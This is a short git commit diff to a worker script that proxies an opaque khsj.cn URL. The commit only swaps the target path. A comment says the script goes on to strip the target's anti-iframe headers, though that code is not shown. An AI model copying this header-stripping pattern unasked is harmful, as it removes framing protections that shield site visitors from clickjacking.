b8bcbf9dec72b0f14915afb8dc9e3cec2268754d
Hym <105768239+opooor@users.noreply.github.com>
2026-06-06 14:41:43 +0800

    Update _worker.js

--- _worker.js
+++ _worker.js
@@ -1,6 +1,6 @@
 export default {
   async fetch(request) {
-    const targetUrl = "https://khsj.cn/a9x3p31vq25n8lp/";
+    const targetUrl = "https://khsj.cn/12slo29qlbuxmwl/";
     const resp = await fetch(targetUrl, { redirect: "follow" });
     const headers = new Headers(resp.headers);
     // 删除防iframe嵌套头部
